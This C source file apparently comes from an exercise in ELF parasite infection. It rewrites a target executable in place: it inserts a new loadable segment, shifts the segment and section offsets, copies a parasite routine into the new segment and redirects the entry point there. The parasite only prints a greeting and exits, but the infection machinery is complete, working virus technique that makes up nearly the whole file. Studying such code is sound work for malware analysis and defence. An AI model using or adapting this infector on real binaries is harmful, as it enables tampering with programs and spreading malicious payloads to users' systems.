/* new_load_infect.c 
 * parasite a piece of codes to print a greeting message. 
 * these codes just print a greeting message and exit then. 
 * parasited code will be stored in an new loadable segment.
 * Usage: ./new_load_infect <host_file>
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdint.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>

#define PATCH_OFFSET 65
#define ALIGN(x, align) (x + align - 1) & (~(align - 1))


static volatile inline void 
_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));

static volatile inline void
_write(int fd, char *buffer, unsigned int len)
{
    __asm__ volatile(
        /* write(1, "[I'm in here]\n", 14) */
        "mov %0, %%edi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%edx\n"
        "mov $1, %%rax\n"
        "syscall\n"
        
        /* exit(0) */
        "mov $0, %%edi\n"
        "mov $60, %%rax\n"
        "syscall\n"
        : 
        : "g"(fd), "g"(buffer), "g"(len)
    );
}

void parasite_greeting()
{
    char str[] = {'[', 'I', '\'', 'm', 
    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
    _write(1, str, 14);
    
    /*
    __asm__ volatile(
        "mov $0x401178, %%rax\n"
        "jmp *%%rax\n"
        :
        : 
    );
    */
}

uint8_t *create_shellcode(void (*fn)(),size_t len)
{
    int i;
    uint8_t *mem = malloc(len);
    uint8_t *ptr = (uint8_t *)fn;
    for(i = 0; i < len; i++) mem[i] = ptr[i];
    return mem;
}

uint64_t f1 = (uint64_t)parasite_greeting;
uint64_t f2 = (uint64_t)create_shellcode;

int main(int argc, char *argv[])
{
    if(argc < 2)
    {
        printf("Usage: %s <exec_file>\n", argv[0]);
        exit(-1);
    }
    size_t parasite_len = ((f2 - f1) + 7) & (~7);
    uint8_t *shellcode = create_shellcode(parasite_greeting, parasite_len);

    char *file_name = strdup(argv[1]);
    int fd;
    if((fd = open(file_name, O_RDWR)) < 0)
    {
        perror("open");
        exit(-1);
    }
    struct stat st;
    if(fstat(fd, &st) < 0)
    {
        perror("fstat");
        exit(-1);
    }
    uint8_t *mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == NULL)
    {
        perror("mmap");
        exit(-1);
    }
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
    size_t origin_hdr_size = ehdr->e_ehsize + ehdr->e_phentsize * ehdr->e_phnum;
    size_t first_remained = 0;
    uint64_t align;
    Elf64_Addr evil_addr;
    Elf64_Off evil_off;
    size_t remain = 0;
    size_t text_size;
    Elf64_Off text_offset;
    int first = 0;
    int i;
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if(phdr[i].p_type == PT_PHDR)
        {
            phdr[i].p_memsz += sizeof(Elf64_Phdr);
            phdr[i].p_filesz += sizeof(Elf64_Phdr); 
        }
        if(phdr[i].p_type == PT_INTERP || phdr[i].p_type == PT_NOTE || phdr[i].p_type == PT_GNU_PROPERTY)
        {
            phdr[i].p_offset += sizeof(Elf64_Phdr);
            phdr[i].p_vaddr += sizeof(Elf64_Phdr);
            phdr[i].p_paddr += sizeof(Elf64_Phdr);
        }
        if(remain)
        {
            /* patch the offset and addr of the following segments */
            phdr[i].p_offset += ALIGN(parasite_len, align);
            phdr[i].p_vaddr += ALIGN(parasite_len, align);
            phdr[i].p_paddr += ALIGN(parasite_len, align);
        }
        if(phdr[i].p_type == PT_LOAD)
        {
            align = phdr[i].p_align;
            if(!first)
            {
                first_remained = phdr[i].p_filesz - origin_hdr_size;
                phdr[i].p_filesz += sizeof(Elf64_Phdr);
                phdr[i].p_memsz += sizeof(Elf64_Phdr);
                first = 1;
            }
            if(phdr[i].p_flags == PF_R + PF_X)
            {
                text_size = phdr[i].p_filesz;
                text_offset = phdr[i].p_offset;
                evil_off = phdr[i].p_offset + ALIGN(phdr[i].p_filesz, align);
                evil_addr = phdr[i].p_vaddr + ALIGN(phdr[i].p_memsz, align);
                remain = phdr[i].p_offset + ALIGN(phdr[i].p_filesz, align);
            } 
        }
        
    }

    ehdr->e_shoff += ALIGN(parasite_len, align);
    ehdr->e_phnum++;
    ehdr->e_entry = evil_addr;

    Elf64_Phdr evil_phdr_ent;
    evil_phdr_ent.p_align = align;
    evil_phdr_ent.p_filesz = parasite_len;
    evil_phdr_ent.p_memsz = parasite_len;
    evil_phdr_ent.p_flags = PF_R | PF_X;
    evil_phdr_ent.p_type = PT_LOAD;
    evil_phdr_ent.p_offset = evil_off;
    evil_phdr_ent.p_vaddr = evil_addr;
    evil_phdr_ent.p_paddr = evil_addr;

    for(i = 0; i < ehdr->e_shnum; i++)
    {
        if(shdr[i].sh_offset > evil_off)
        {
            shdr[i].sh_offset += ALIGN(parasite_len, align);
            shdr[i].sh_addr += ALIGN(parasite_len, align);
        }
        if(shdr[i].sh_offset < text_offset)
        {
            shdr[i].sh_offset += sizeof(Elf64_Phdr);
            shdr[i].sh_addr += sizeof(Elf64_Phdr);
        }
    }

    if(lseek(fd, 0, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    
    if(write(fd, mem, origin_hdr_size) < 0)
    {
        perror("write original header");
        exit(-1);
    }
    if(lseek(fd, origin_hdr_size, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, &evil_phdr_ent, sizeof(Elf64_Phdr)) < 0)
    {
        perror("write evil_phdr_entry");
        exit(-1);
    }
    if(lseek(fd, origin_hdr_size + sizeof(Elf64_Phdr), SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    
    if(write(fd, &mem[origin_hdr_size], first_remained) < 0)
    {
        perror("write remained part of header");
        exit(-1);
    }
    if(lseek(fd, text_offset, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, &mem[text_offset], text_size) < 0)
    {
        perror("write text_segment");
        exit(-1);
    }
    if(lseek(fd, evil_off, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    if(write(fd, parasite_greeting, parasite_len) < 0)
    {
        perror("write parasite codes");
        exit(-1);
    }
    size_t remained_offset = evil_off + ALIGN(parasite_len, align);
    if(lseek(fd, remained_offset, SEEK_SET) < 0)
    {
        perror("lseek");
        exit(-1);
    }
    size_t remained_size = st.st_size - remain;
    if(write(fd, &mem[remain], remained_size) < 0)
    {
        perror("write remained part of host file");
        exit(-1);
    }
    close(fd);
}